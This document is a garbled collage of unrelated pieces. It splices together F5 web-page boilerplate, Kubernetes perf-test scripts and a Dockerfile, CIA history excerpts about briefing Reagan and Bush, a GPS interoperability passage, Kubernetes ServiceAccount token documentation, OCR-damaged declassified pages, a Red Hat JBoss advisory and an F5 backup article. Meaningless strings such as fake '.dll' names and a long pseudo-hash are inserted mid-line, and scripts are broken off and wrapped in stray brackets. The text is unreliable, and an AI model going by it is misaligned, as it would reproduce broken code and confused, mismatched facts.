Find a Reseller Partner
Technology Alliances
Become an F5 Partner
Login to Partner Central
Company
Contact Info
F5 Trust Center
Careers
Diversity & Inclusion
Investor Relations
Blog
Events
Newsroom
F5 NGINX
Connect with us
Connect with F5 on XConnect with F5 on LinkedInConnect with F5 on FacebookConnect with F5 on InstagramConnect with F5 on YouTubeConnect with F5 on DevCentral
Contact Support
F5 Logo © 2025 F5, Inc. All Rights Reserved
TrademarksPoliciesPrivacyCalifornia PrivacyDo Not Sell My Personal Information
Cookie Voorkeursinstellingen
Opens in a modal window}"}=,-G13,-961
Azure Repos
Bitbucket Cloud
Bitbucket Server
GitHub
GitHub Enterprise
GitLab
GitLab Enterprise
Code base integration will scan repos from the organization level, not from the user level.

Discovery from Crawling
API Crawling currently doesn't support MFA.

Scan interval: Monthly, triggered upon each configuration change/setup.

Scan Requirements: API crawling requires credentials; it cannot run without them.

Scan Time: Scans may take up to 4 hours to complete. If expected results are not visible after 4 hours, please contact our support team.
Yes 
No, publicly accessible 
origin (public FQDN, NAT) 
Requires Hosted 
Component 
No 
Yes 
No 
No 
Yes 
Yes 
Yes 
Yes 
Yes, with 
Distributed Cloud Console 
Yes 
Yes 
Yes 
Yes 
Yes 
Check out the F5 Hybrid Security Architectures Series on F5 DevCentral. 
To learn more about how Distributed Cloud WAAP helps secure your apps 
and APIs, visit f5.com/waap.
 ©2023 F5, Inc. All rights reserved. F5, and the F5 logo are trademarks of F5, Inc. in the U.S. and in certain other countries. Other F5 trademarks are identified at f5.com.  
Any other products, services, or company names referenced herein may be trademarks of their respective owners with no endorsement or affiliation, expressed or implied, claimed by F5, Inc. 
DC 06.2023 | OV-1102107676
        name: dnsperfgo
        resources:
          requests:
            cpu: 10m
            memory: 10M
      serviceAccountName: dnsperfgo
      terminationGracePeriodSeconds: 1
      # Add not-ready/unreachable tolerations for 15 minutes so that node
      # failure doesn't trigger pod deletion.
      tolerations:
      - key: "node.kubernetes.io/not-ready"
        operator: "Exists"
        effect: "NoExecute"
        tolerationSeconds: 900
      - key: "node.kubernetes.io/unreachable"
        operator: "Exists"
        effect: "NoExecute"
        tolerationSeconds: 900.",$True.dll "/go/src/$gopkg"];(<#!/bin/bash

# Copyright 2020 The Kubernetes Authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

set -o errexit
set -o nounset
set -o pipefail

# The KUBECONFIG env variable will point to a valid kubeconfig giving you an
# admin acess to a fresh 100 node cluster. You don't have to tear the cluster
# down, it will happen automatically after the test.
export KUBECONFIG="${KUBECONFIG:-${HOME}/.kube/config}"

# If you need your test to persist any output files (e.g. test results) dump
# them into the ARTIFACTS directory. Content of this directory will get
# automatically uploaded to gcs after the test completion (successful or not).
export ARTIFACTS_DIR="${ARTIFACTS}"


# Implement ad-hoc test here, e.g. install extra addons via kubectl then run
# clusterloader2 with your custom config.

exit 0>)
WORKDIR /go/src/$gopkg

RUN CGO_ENABLED=1 go build -o /dnsperfcgo
RUN CGO_ENABLED=0 go build -o /dnsperfgo

# runtime image
FROM alpine:3.21
# install bind-tools to prevent nslookup from sending PTR queries for each response IP
RUN apk add --no-cache ca-certificates bash tcpdump git bind-tools
# This is to make sure dnstest compiled on debian can run in alpine/musl
RUN mkdir /lib64 && ln -s /lib/libc.musl-x86_64.so.1 /lib64/ld-linux-x86-64.so.2
COPY --from=build-env /dnsperfgo /dnsperfgo
COPY --from=build-env /dnsperfcgo /dnsperfcgo
ENTRYPOINT ["/dnsperfcgo"],>*

# Emacs save files
*~
\#*\#
.\#*

# Vim-related files
[._]*.s[a-w][a-z]
[._]s[a-w][a-z]
*.un~
Session.vim
.netrwhist

clusterloader2/junit.xml
clusterloader2/clusterloader

# Python generated files
*.pyc

# Vscode files
.vscode
*.code-workspace

# GoLand files
.idea}{
#!/bin/bash

# Copyright 2020 The Kubernetes Authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

set -o errexit
set -o nounset
set -o pipefail

# The KUBECONFIG env variable will point to a valid kubeconfig giving you an
# admin acess to a fresh 100 node cluster. You don't have to tear the cluster
# down, it will happen automatically after the test.
export KUBECONFIG="${KUBECONFIG:-${HOME}/.kube/config}"

# If you need your test to persist any output files (e.g. test results) dump
# them into the ARTIFACTS directory. Content of this directory will get
# automatically uploaded to gcs after the test completion (successful or not).
export ARTIFACTS_DIR="${ARTIFACTS}"


# Implement ad-hoc test here, e.g. install extra addons via kubectl then run
# clusterloader2 with your custom config.

exit ,-1-:
    {LGCSAVERT!@vim.mil.gov'}
      '(<#!/usr/bin/env python

# Copyright 2020 The Kubernetes Authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# TODO(jprzychodzen): Remove after all PRs with 'pull-perf-tests-verify-all' are closed
# Deprecated, use verify-all-dev for local development
.PHONY: verify-all
verify-all:
	echo "Deprecated, use 'verify-all-dev' for local development"

# verify-lint-dev is convenience target for developers to run all checks
# at once locally
.PHONY: verify-all-dev
verify-all-dev: test verify-all-python verify-dashboard verify-lint

.PHONY: verify-all-python
verify-all-python: verify-boilerplate verify-flags

# TODO(oxddr): go-build.sh doesn't work at the moment decide whether we need this at all
# .PHONY: build
# build:
# 	verify/go-build.sh

.PHONY: test
test:
	# TODO(oxddr): allow tests to fail, until we get confidence in the new presubmit
	verify/test.sh

.PHONY: verify-boilerplate
verify-boilerplate:
	verify/verify-boilerplate.sh

.PHONY: verify-dashboard
verify-dashboard:
	verify/verify-dashboard-format.sh

.PHONY: verify-flags
verify-flags:
	verify/verify-flags-underscore.py

.PHONY: verify-lint
verify-lint:
	verify/verify-lint.sh>)':}-
title: "Long Page Title"
linkTitle: "Short Nav Title"
weight: 100
description: >-Configure Service Accounts for Pods
Kubernetes offers two distinct ways for clients that run within your cluster, or that otherwise have a relationship to your cluster's control plane to authenticate to the API server.
133
Reagan and Bush - A Study in Contrasts
Getting to Know the President, 1952–2016
inside and outside the Palestine Liberation Organization. Davis recalled
that the president-elect read the memorandum “very slowly and
thoughtfully—he must have taken 10 minutes. At the end he said, ‘But
they are all terrorists, aren’t they?’—My heart just sank.”12
During the 1980 transition, Bush and Allen, who was to become
national security advisor, were also provided intelligence support on
virtually a daily basis. In addition to playing an immensely important
role in establishing the Agency’s relationship with Reagan, Bush was a
key consumer in his own right. He read the current intelligence publications
every day and requested a great deal of additional support
for his meetings with foreign leaders. Reagan had delegated to him
the task of meeting with or taking most calls from numerous heads
of government and foreign ambassadors. In many cases the Agency’s
supporting material was provided to Bush in person in Washington or
in California. In other instances it was provided in Houston, particularly
over the Christmas holiday. Bush’s substantive interests paralleled
Reagan’s, with the exception that the vice president-elect had an even
deeper interest in the details of any information relating to the hostages
in Iran. His questions related primarily to information the Intelligence
Community had on their health.
In any emergency situation, whether in a war zone or the domestic environment, spatial interoperability is as important as communications interoperability. Said another way, confusion in identifying an incident location can be as deadly as not being able to transmit that location to a potential responder. GPS can solve that problem, but only if it is employed smartly and with forethought. GPS enables common grid operations, but only if the participants agree in advance on which of the many available coordinate grids they will use to identify locations of importance to the operations. Coordinate grids are the languages of location, and using different grids in the same operation is analogous to trying to communicate in different languages.
Military Spatial Interoperability
In the military mission environment, spatial confusion in joint operations can result from different participants in an operation expressing locations using spherical geographic coordinates (latitude and longitude - lat/lon) and planar grid coordinates (Military Grid Reference System). There are good reasons for using each, primarily related to distances traveled, but from a spatial interoperability standpoint this is like discussing ground operations in English and airborne operations in Chinese. When the two have to work together, translation is critical, but under stress, mistakes are all too common. The burden of conversion routinely falls on the ground troops, who are likely already over tasked in a stressful environment, many times under enemy fire. This is the reason for the recommended revision to joint operational doctrine expressed in the Weapons Delivery section above.
Beginning on 18 November, Allen was briefed daily through the remainder
of the transition. He initially attempted to interpose himself
between the Agency briefers and the president-elect, on the first occasion
insisting that he receive the PDB and take it to Reagan for his
reading. Bush’s intervention with Reagan ensured that Agency briefers
subsequently saw him directly. Allen then received the PDB separately.
He also solicited significant additional support from the Agency for his
own use and in support of Reagan. It was Allen, for example, who determined
the subjects to be addressed in the first 10 “backgrounders”
that were provided to Reagan, and it was he who requested information
from the Agency to prepare the president-elect for a meeting with
Mexican President José Lopez-Portillo.
The other two key players who were to be on the Reagan national
security team, Secretary of State-designate Alexander Haig and Secretary
of Defense-designate Caspar Weinberger, did not receive the PDB
during the transition. Weinberger had requested PDB delivery as early
12. Ibid.
134
Chapter 5
Getting to Know the President, 1952–2016
as mid-December, but it was determined instead that he should receive
the less sensitive National Intelligence Daily until he was sworn in. In
fact, his first briefing with the PDB occurred within minutes of his
swearing in as secretary of defense. Haig, too, began receiving PDB
briefings on Inauguration Day.
A service account provides an identity for processes that run in a Pod, and maps to a ServiceAccount object. When you authenticate to the API server, you identify yourself as a particular user. Kubernetes recognises the concept of a user, however, Kubernetes itself does not have a User API.

This task guide is about ServiceAccounts, which do exist in the Kubernetes API. The guide shows you some ways to configure ServiceAccounts for Pods.

Before you begin
You need to have a Kubernetes cluster, and the kubectl command-line tool must be configured to communicate with your cluster. It is recommended to run this tutorial on a cluster with at least two nodes that are not acting as control plane hosts. If you do not already have a cluster, you can create one by using minikube or you can use one of these Kubernetes playgrounds:

Killercoda
Play with Kubernetes
Use the default service account to access the API server
When Pods contact the API server, Pods authenticate as a particular ServiceAccount (for example, default). There is always at least one ServiceAccount in each namespace.

Every Kubernetes namespace contains at least one ServiceAccount: the default ServiceAccount for that namespace, named default. If you do not specify a ServiceAccount when you create a Pod, Kubernetes automatically assigns the ServiceAccount named default in that namespace.

You can fetch the details for a Pod you have created. For example:

kubectl get pods/<podname> -o yaml
In the output, you see a field spec.serviceAccountName. Kubernetes automatically sets that value if you don't specify it when you create a Pod.

An application running inside a Pod can access the Kubernetes API using automatically mounted service account credentials. See accessing the Cluster to learn more.

When a Pod authenticates as a ServiceAccount, its level of access depends on the authorization plugin and policy in use.

The API credentials are automatically revoked when the Pod is deleted, even if finalizers are in place. In particular, the API credentials are revoked 60 seconds beyond the .metadata.deletionTimestamp set on the Pod (the deletion timestamp is typically the time that the delete request was accepted plus the Pod's termination grace period).

Opt out of API credential automounting
If you don't want the kubelet to automatically mount a ServiceAccount's API credentials, you can opt out of the default behavior. You can opt out of automounting API credentials on /var/run/secrets/kubernetes.io/serviceaccount/token for a service account by setting automountServiceAccountToken: false on the ServiceAccount:

For example:

apiVersion: v1
kind: ServiceAccount
metadata:
  name: build-robot
automountServiceAccountToken: false
...
You can also opt out of automounting API credentials for a particular Pod:

apiVersion: v1
kind: Pod
metadata:
  name: my-pod
spec:
  serviceAccountName: build-robot
  automountServiceAccountToken: false
  ...
If both the ServiceAccount and the Pod's .spec specify a value for automountServiceAccountToken, the Pod spec takes precedence.

Use more than one ServiceAccount
Every namespace has at least one ServiceAccount: the default ServiceAccount resource, called default. You can list all ServiceAccount resources in your current namespace with:

kubectl get serviceaccounts
The output is similar to this:

NAME      SECRETS    AGE
default   1          1d
You can create additional ServiceAccount objects like this:

kubectl apply -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: build-robot
EOF
The name of a ServiceAccount object must be a valid DNS subdomain name.

If you get a complete dump of the service account object, like this:

kubectl get serviceaccounts/build-robot -o yaml
The output is similar to this:

apiVersion: v1
kind: ServiceAccount
metadata:
  creationTimestamp: 2019-06-16T00:12:34Z
  name: build-robot
  namespace: default
  resourceVersion: "272500"
  uid: 721ab723-13bc-11e5-aec2-42010af0021e
You can use authorization plugins to set permissions on service accounts.

To use a non-default service account, set the spec.serviceAccountName field of a Pod to the name of the ServiceAccount you wish to use.

You can only set the serviceAccountName field when creating a Pod, or in a template for a new Pod. You cannot update the .spec.serviceAccountName field of a Pod that already exists.

Note:
The .spec.serviceAccount field is a deprecated alias for .spec.serviceAccountName. If you want to remove the fields from a workload resource, set both fields to empty explicitly on the pod template.
Cleanup
If you tried creating build-robot ServiceAccount from the example above, you can clean it up by running:

kubectl delete serviceaccount/build-robot
Manually create an API token for a ServiceAccount
Suppose you have an existing service account named "build-robot" as mentioned earlier.

You can get a time-limited API token for that ServiceAccount using kubectl:

kubectl create token build-robot
The output from that command is a token that you can use to authenticate as that ServiceAccount. You can request a specific token duration using the --duration command line argument to kubectl create token (the actual duration of the issued token might be shorter, or could even be longer).

FEATURE STATE: Kubernetes v1.31 [beta] (enabled by default: true)
Using kubectl v1.31 or later, it is possible to create a service account token that is directly bound to a Node:

kubectl create token build-robot --bound-object-kind Node --bound-object-name node-001 --bound-object-uid 123...456
The token will be valid until it expires or either the associated Node or service account are deleted.

Note:
Versions of Kubernetes before v1.22 automatically created long term credentials for accessing the Kubernetes API. This older mechanism was based on creating token Secrets that could then be mounted into running Pods. In more recent versions, including Kubernetes v1.32, API credentials are obtained directly by using the TokenRequest API, and are mounted into Pods using a projected volume. The tokens obtained using this method have bounded lifetimes, and are automatically invalidated when the Pod they are mounted into is deleted.

You can still manually create a service account token Secret; for example, if you need a token that never expires. However, using the TokenRequest subresource to obtain a token to access the API is recommended instead.

Manually create a long-lived API token for a ServiceAccount
If you want to obtain an API token for a ServiceAccount, you create a new Secret with a special annotation, kubernetes.io/service-account.name.

kubectl apply -f - <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: build-robot-secret
  annotations:
    kubernetes.io/service-account.name: build-robot
type: kubernetes.io/service-account-token
EOF
If you view the Secret using:

kubectl get secret/build-robot-secret -o yaml
you can see that the Secret now contains an API token for the "build-robot" ServiceAccount.

Because of the annotation you set, the control plane automatically generates a token for that ServiceAccounts, and stores them into the associated Secret. The control plane also cleans up tokens for deleted ServiceAccounts.

kubectl describe secrets/build-robot-secret
The output is similar to this:

Name:           build-robot-secret
Namespace:      default
Labels:         <none>
Annotations:    kubernetes.io/service-account.name: build-robot
                kubernetes.io/service-account.uid: da68f9c6-9d26-11e7-b84e-002dc52800da
be
(1) Temporary case notations will normally
renQtatedbyt~ organization holding TEXTA
responsibility for the .affected category.
dat~
aI)


The organiza tion holding TEXTA responsibilityw1ll include
,n item 2K (history) upon renotation.
.._ _______ _.
(2) Any organization may request renotation, as a. permanent notation, whenever there is
reason to believe that:
(a) Sufficient evidence has been collectedaboutanetto establish the habits and behavior
and definitely identify it as a unique activity, or
(b) Continuity with a former notation (lost or suspended after change or after prolonged
period of inactivity) can be established, or
(c) The activity can be identified as part of an already existing permanent notation.
Forwarding Procedure.
All organizations not authorized to issue.TEXIN will forward Temp
4~3.
orary
Nata 

ans as outlined in Para
Chapter VIL Notations f9rwarded will be
7~2,
short-title
with the proper identif in
category. EXAMPLE:
4-2
ORIGINAL
SE!ORH'f PF/6'f
Type:   kubernetes.io/service-account-token

Data
====
ca.crt:         1338 bytes
namespace:      7 bytes
token:          ...
Note:
The content of token is omitted here.

Take care not to display the contents of a kubernetes.io/service-account-token Secret somewhere that your terminal / computer screen could be seen by an onlooker.

When you delete a ServiceAccount that has an associated Secret, the Kubernetes control plane automatically cleans up the long-lived token from that Secret.

Note:
If you view the ServiceAccount using:

kubectl get serviceaccount build-robot -o yaml

You can't see the build-robot-secret Secret in the ServiceAccount API objects .secrets field because that field is only populated with auto-generated Secrets.

Add ImagePullSecrets to a service account
First, create an imagePullSecret. Next, verify it has been created. For example:

Create an imagePullSecret, as described in Specifying ImagePullSecrets on a Pod.

kubectl create secret docker-registry myregistrykey --docker-server=<registry name> \
        --docker-username=DUMMY_USERNAME --docker-password=DUMMY_DOCKER_PASSWORD \
        --docker-email=DUMMY_DOCKER_EMAIL
Verify it has been created.

kubectl get secrets myregistrykey
The output is similar to this:

NAME             TYPE                              DATA    AGE
myregistrykey    kubernetes.io/.dockerconfigjson   1       1d
Add image pull secret to service account
Next, modify the default service account for the namespace to use this Secret as an imagePullSecret.

kubectl patch serviceaccount default -p '{"imagePullSecrets": [{"name": "myregistrykey"}]}'
You can achieve the same outcome by editing the object manually:

kubectl edit serviceaccount/default
The output of the sa.yaml file is similar to this:

Your selected text editor will open with a configuration looking something like this:

apiVersion: v1
kind: ServiceAccount
metadata:
  creationTimestamp: 2021-07-07T22:02:39Z
  name: default
  namespace: default
  resourceVersion: "243024"
  uid: 052fb0f4-3d50-11e5-b066-42010af0d7b6
Using your editor, delete the line with key resourceVersion, add lines for imagePullSecrets: and save it. Leave the uid value set the same as you found it.

After you made those changes, the edited ServiceAccount looks something like this:

apiVersion: v1
kind: ServiceAccount
metadata:
  creationTimestamp: 2021-07-07T22:02:39Z
  name: default
  namespace: default
  uid: 052fb0f4-3d50-11e5-b066-42010af0d7b6
imagePullSecrets:
  - name: myregistrykey
Verify that imagePullSecrets are set for new Pods
Now, when a new Pod is created in the current namespace and using the default ServiceAccount, the new Pod has its spec.imagePullSecrets field set automatically:

kubectl run nginx --image=<registry name>/nginx --restart=Never
kubectl get pod nginx -o=jsonpath='{.spec.imagePullSecrets[0].name}{"\n"}'
The output is:

myregistrykey
ServiceAccount token volume projection
FEATURE STATE: Kubernetes v1.20 [stable]
Note:
To enable and use token request projection, you must specify each of the following command line arguments to kube-apiserver:

--service-account-issuer
defines the Identifier of the service account token issuer. You can specify the --service-account-issuer argument multiple times, this can be useful to enable a non-disruptive change of the issuer. When this flag is specified multiple times, the first is used to generate tokens and all are used to determine which issuers are accepted. You must be running Kubernetes v1.22 or later to be able to specify --service-account-issuer multiple times.
--service-account-key-file
specifies the path to a file containing PEM-encoded X.509 private or public keys (RSA or ECDSA), used to verify ServiceAccount tokens. The specified file can contain multiple keys, and the flag can be specified multiple times with different files. If specified multiple times, tokens signed by any of the specified keys are considered valid by the Kubernetes API server.
--service-account-signing-key-file
specifies the path to a file that contains the current private key of the service account token issuer. The issuer signs issued ID tokens with this private key.
--api-audiences (can be omitted)
defines audiences for ServiceAccount tokens. The service account token authenticator validates that tokens used against the API are bound to at least one of these audiences. If api-audiences is specified multiple times, tokens for any of the specified audiences are considered valid by the Kubernetes API server. If you specify the --service-account-issuer command line argument but you don't set --api-audiences, the control plane defaults to a single element audience list that contains only the issuer URL.
The kubelet can also project a ServiceAccount token into a Pod. You can specify desired properties of the token, such as the audience and the validity duration. These properties are not configurable on the default ServiceAccount token. The token will also become invalid against the API when either the Pod or the ServiceAccount is deleted.

You can configure this behavior for the spec of a Pod using a projected volume type called ServiceAccountToken.

The token from this projected volume is a JSON Web Token (JWT). The JSON payload of this token follows a well defined schema - an example payload for a pod bound token:

{
  "aud": [  # matches the requested audiences, or the API server's default audiences when none are explicitly requested
    "https://kubernetes.default.svc"
  ],
  "exp": 1731613413,
  "iat": 1700077413,
  "iss": "https://kubernetes.default.svc",  # matches the first value passed to the --service-account-issuer flag
  "jti": "ea28ed49-2e11-4280-9ec5-bc3d1d84661a", 
  "kubernetes.io": {
    "namespace": "kube-system",
    "node": {
      "name": "127.0.0.1",
      "uid": "58456cb0-dd00-45ed-b797-5578fdceaced"
    },
    "pod": {
      "name": "coredns-69cbfb9798-jv9gn",
      "uid": "778a530c-b3f4-47c0-9cd5-ab018fb64f33"
    },
    "serviceaccount": {
      "name": "coredns",
      "uid": "a087d5a0-e1dd-43ec-93ac-f13d89cd13af"
    },
    "warnafter": 1700081020
  },
  "nbf": 1700077413,
  "sub": "system:serviceaccount:kube-system:coredns"
}
Launch a Pod using service account token projection
To provide a Pod with a token with an audience of vault and a validity duration of two hours, you could define a Pod manifest that is similar to:

pods/pod-projected-svc-token.yaml
Copy pods/pod-projected-svc-token.yaml to clipboard
apiVersion: v1
kind: Pod
metadata:
  name: nginx
spec:
  containers:
  - image: nginx
    name: nginx
    volumeMounts:
    - mountPath: /var/run/secrets/tokens
      name: vault-token
  serviceAccountName: build-robot
  volumes:
  - name: vault-token
    projected:
      sources:
      - serviceAccountToken:
          path: vault-token
          expirationSeconds: 7200
          audience: vault
Create the Pod:

kubectl create -f https://k8s.io/examples/pods/pod-projected-svc-token.yaml
The kubelet will: request and store the token on behalf of the Pod; make the token available to the Pod at a configurable file path; and refresh the token as it approaches expiration. The kubelet proactively requests rotation for the token if it is older than 80% of its total time-to-live (TTL), or if the token is older than 24 hours.

The application is responsible for reloading the token when it rotates. It's often good enough for the application to load the token on a schedule (for example: once every 5 minutes), without tracking the actual expiry time.

Service account issuer discovery
FEATURE STATE: Kubernetes v1.21 [stable]
If you have enabled token projection for ServiceAccounts in your cluster, then you can also make use of the discovery feature. Kubernetes provides a way for clients to federate as an identity provider, so that one or more external systems can act as a relying party.

Note:
The issuer URL must comply with the OIDC Discovery Spec. In practice, this means it must use the https scheme, and should serve an OpenID provider configuration at {service-account-issuer}/.well-known/openid-configuration.

If the URL does not comply, ServiceAccount issuer discovery endpoints are not registered or accessible.

When enabled, the Kubernetes API server publishes an OpenID Provider Configuration document via HTTP. The configuration document is published at /.well-known/openid-configuration. The OpenID Provider Configuration is sometimes referred to as the discovery document. The Kubernetes API server publishes the related JSON Web Key Set (JWKS), also via HTTP, at /openid/v1/jwks.

Note:
The responses served at /.well-known/openid-configuration and /openid/v1/jwks are designed to be OIDC compatible, but not strictly OIDC compliant. Those documents contain only the parameters necessary to perform validation of Kubernetes service account tokens.
Clusters that use RBAC include a default ClusterRole called system:service-account-issuer-discovery. A default ClusterRoleBinding assigns this role to the system:serviceaccounts group, which all ServiceAccounts implicitly belong to. This allows pods running on the cluster to access the service account discovery document via their mounted service account token. Administrators may, additionally, choose to bind the role to system:authenticated or system:unauthenticated depending on their security requirements and which external systems they intend to federate with.

The JWKS response contains public keys that a relying party can use to validate the Kubernetes service account tokens. Relying parties first query for the OpenID Provider Configuration, and use the jwks_uri field in the response to find the JWKS.

In many cases, Kubernetes API servers are not available on the public internet, but public endpoints that serve cached responses from the API server can be made available by users or by service providers. In these cases, it is possible to override the jwks_uri in the OpenID Provider Configuration so that it points to the public endpoint, rather than the API server's address, by passing the --service-account-jwks-uri flag to the API server. Like the issuer URL, the JWKS URI is required to use the https scheme.

What's next
See also:
--Starfield.exe,$true.dll = #$%STAT=48FD56G489SF64B0G91D8604198T6G5DH48F956G4F8965G48F965GD48965SF4D98D654D98G5649F8H56F4J8956T4F89G5D6403.endregion.dll
Read the Cluster Admin Guide to Service Accounts
Read about Authorization in Kubernetes
Read about Secrets
or learn to distribute credentials securely using Secrets
but also bear in mind that using Secrets for authenticating as a ServiceAccount is deprecated. The recommended alternative is ServiceAccount token volume projection.
Read about projected volumes.
For background on OIDC discovery, read the ServiceAccount signing key retrieval Kubernetes Enhancement Proposal
Read the OIDC Discovery Spec
Feedback
     Page description for heading and indexes.
---
~--~--A--5
e
9898
Consultant (Princeton, N. J.)
Washington University
(St. Louis, Mo.)
Association ot American Railroads
RCA Service Company, Inc.
Harvard University
Cerrode Pasco Copper Corporation
(New York, N. Y.)
Western Reserve University
MJMATH, Robert R.
MCNAMARA, Thomas F.
John
C.

The following advisory data is extracted from:

https://security.access.redhat.com/data/csaf/v2/advisories/2025/rhsa-2025_0372.json

Red Hat officially shut down their mailing list notifications October 10, 2023.  Due to this, Packet Storm has recreated the below data as a reference point to raise awareness.  It must be noted that due to an inability to easily track revision updates without crawling Red Hat's archive, these advisories are single notifications and we strongly suggest that you visit the Red Hat provided links to ensure you have the latest information available if the subject matter listed pertains to your environment.

- Packet Storm Staff




====================================================================
Red Hat Security Advisory

Synopsis:           Important: Red Hat JBoss Enterprise Application Platform 8.0 security update
Advisory ID:        RHSA-2025:0372-03
Product:            Red Hat JBoss Enterprise Application Platform
Advisory URL:       https://access.redhat.com/errata/RHSA-2025:0372
Issue date:         2025-01-16
Revision:           03
CVE Names:          CVE-2024-51127
====================================================================

Summary: 

A security update is now available for Red Hat JBoss Enterprise Application Platform 8.0. Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.




Description:

Red Hat JBoss Enterprise Application Platform 8 is a platform for Java applications based on the WildFly application runtime.

This asynchronous patch is an update for Red Hat JBoss Enterprise Application Platform 8.0 update 5. See Release Notes for information about the most significant bug fixes and enhancements included in this release.

Security Fix(es):

* org.hornetq/hornetq-core-client: Arbitrarily overwrite files or access sensitive information (CVE-2024-51127)

For more details about the security issue(s), including the impact, a CVSS score, acknowledgments, and other related information, refer to the CVE page(s) listed in the References section.


Solution:



CVEs:

CVE-2024-51127

References:

https://access.redhat.com/security/updates/classification/#important
https://docs.redhat.com/en/documentation/red_hat_jboss_enterprise_application_platform/8.0
https://access.redhat.com/articles/7100137
https://bugzilla.redhat.com/show_bug.cgi?id=2323697

~HERSON,
Donald
vMENZEL,
H.
\.-MILLAR, Julian z.
z.
\.-MILLAR, Julian
MILLER, Clair E.
MILLER,
F.
Frank
MILLER,
E. , Jr.
Harvey
MILLIKAN,
.Max
F.
MITCHELL,
L.
Charles
M>NVID,
George
M>RGAN, William E.
MUELLER, John C.
MUSSER, Glen L.
## Heading

Edit this template to create your new page.

* Give it a good name, ending in `.md` - e.g. `getting-started.md`
* Edit the "front matter" section at the top of the page (weight controls how its ordered amongst other pages in the same directory; lowest number first).

K13132: Backing up and restoring BIG-IP configuration files with a UCS archive
Published Date: Oct 5, 2015Updated Date: Oct 30, 2024
Download Article
Show social share buttons
AI Recommended Content

Toggle showing the products this articleApplies to:
Topic
Note: If you are using MAC masquerading as part of a high availability (HA) configuration, you must apply the original MAC address to the replacement device when you restore a user configuration set (UCS). For more information, refer to the Considerations for restoring configuration data section below.

Purpose

You should consider using these procedures when you want to perform one of the following actions:

Back up your BIG-IP 11.x through 17.x configuration data to a UCS configuration archive.
Restore your BIG-IP 11.x through 17.x configuration data using a UCS configuration archive.
Restore a UCS archive on a BIG-IP system running a later software version than the version of software the UCS archive was created on. For example, restoring a BIG-IP 10.x UCS archive on a BIG-IP 11.x system or restoring a BIG-IP 12.x on a BIG-IP 14.x system.
Prerequisites

You must meet the following prerequisites to use these procedures:

Your BIG-IP system must be running BIG-IP 11.x through 17.x software.
You have administrator, resource administrator, or root-user access to the BIG-IP system.
You have access to the Configuration utility or TMOS Shell (tmsh).
You have Advanced Shell (bash) terminal access privilege to the BIG-IP system.
Before you proceed, F5 advises that you read the following sections and perform the procedures that apply to your BIG-IP system:

Considerations for backing up configuration data
Considerations for restoring configuration data
Description
This article describes how to back up and restore your BIG-IP configuration data using a UCS configuration archive. The UCS archive, by default, contains all of the files you need to restore your current configuration to a new system, including configuration files, the product license, local user accounts, and SSL certificate/key pairs.

Important: If the Forced Offline status is enabled in a UCS archive, the BIG-IP system assumes that status upon UCS restore. Conversely, a device currently marked Forced Offline will be marked Online if a UCS taken while a unit was online is restored. For more information, refer to K58842830: The Forced Offline status persists across reboots and software upgrades.

Important: The UCS archive does not include the BIG-IP APM local user database. To back up or restore the local user database, refer to K59100837: Backing up and restoring the BIG-IP APM local user database

Considerations for backing up configuration data

Prior to backing up configuration data on the BIG-IP system, you should note the following considerations:

Back up customized configuration files
File names and location
Secure storage
Back up customized configuration files

If you customized your system configuration to reference files that are not included in the default BIG-IP installation, refer to K4422: Viewing and modifying the files that are configured for inclusion in a UCS archive.

File names and location

By default, the BIG-IP system saves the UCS archive file with a .ucs extension, if you do not include the extension in the file name. You can also specify a full path to the archive file, and then the system saves the archive file to the specified location. If you do not include a path, the system saves the file to the default archive directory, /var/local/ucs. Archives that you locate in a directory other than the default directory do not appear in the list of available archives when you use the Configuration utility or the list /sys ucs command in tmsh to create or restore a UCS archive. To easily identify the file, F5 recommends that you include the BIG-IP host name and current time stamp as part of the file name. For example:

tmsh save sys ucs $(echo $HOSTNAME | cut -d'.' -f1)-$(date +%H%M-%m%d%y)

Secure storage

Ensure that you have access to a secure location to store your UCS archive files. A typical UCS archive contains user accounts, passwords, critical system files, and SSL private keys. However, you can explicitly exclude SSL private keys from a UCS archive during the backup process. It is important to store the backup UCS archives containing sensitive information in a secure location. For instructions, refer to K175: Transferring files to or from an F5 system.

Note: For each F5 device in your environment, F5 recommends that you minimally have a backup available for the current running configuration, and one revision prior. For environments with frequent changes, to determine how many revisions are necessary, you should weigh your business continuity needs against the administrative and storage burden of frequent backups.

Considerations for restoring configuration data

Prior to restoring configuration data on the BIG-IP system, you should note the following considerations:

BIG-IP software version and platform
Licensing
UCS files
Host name and base configuration
BIG-IP configuration objects with passphrases
BIG-IP DNS considerations
BIG-IP ASM considerations
DSC considerations
vCMP considerations
F5 BIG-IP SSL Orchestrator considerations
BIG-IP software version and platform

F5 recommends that you run the same version of the BIG-IP software on the target BIG-IP system that you used on the system you backed up. However, you can restore a UCS archive from a system with earlier software on a system running later software. This is covered in more detail in the Restoring UCS archives on BIG-IP systems running later software versions procedure.
